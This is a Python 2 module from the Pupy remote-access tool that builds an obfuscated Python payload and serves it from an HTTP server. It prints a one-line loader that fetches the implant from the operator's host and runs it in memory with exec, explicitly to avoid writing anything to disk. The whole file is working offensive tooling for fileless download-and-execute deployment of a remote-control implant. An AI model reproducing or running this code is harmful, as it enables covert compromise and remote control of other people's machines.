#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import cPickle, re, os.path, sys
import rpyc, rsa, pyasn1, netaddr
from pupylib.utils.obfuscate import compress_encode_obfs
from pupylib.utils.term import colorize
from pupylib.payloads import dependencies

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

def getLinuxImportedModules():
    '''
    '''
    lines = ""
    with open(os.path.join(ROOT,"conf","imports_done.py")) as f:
        lines=f.read()
    return lines

def pack_py_payload(conf):
    print colorize('[+] ','green')+'generating payload ...'
    fullpayload=[]

    with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
        pupyimportercode = f.read()

    fullpayload.append(
        '\n'.join([
            dependencies.loader(pupyimportercode, 'pupyimporter'),
            'import pupyimporter',
            'pupyimporter.install()',
            dependencies.importer('network', path=ROOT),
            dependencies.importer((
                'rpyc', 'pyasn1', 'rsa',
                'netaddr', 'tinyec', 'umsgpack'))
        ]) + '\n'
    )

    with open(os.path.join(ROOT,'pp.py')) as f:
        code=f.read()

    code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
    fullpayload.append(code+'\n')

    return compress_encode_obfs('\n'.join(fullpayload)+'\n')


def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
    class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            # Send the html message
            self.wfile.write(payload)
            return
    try:
        while True:
            try:
                server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
                break
            except Exception as e:
                # [Errno 98] Adress already in use
                if e[0] == 98:
                    port+=1
                else:
                    raise
        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
        print oneliner
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()
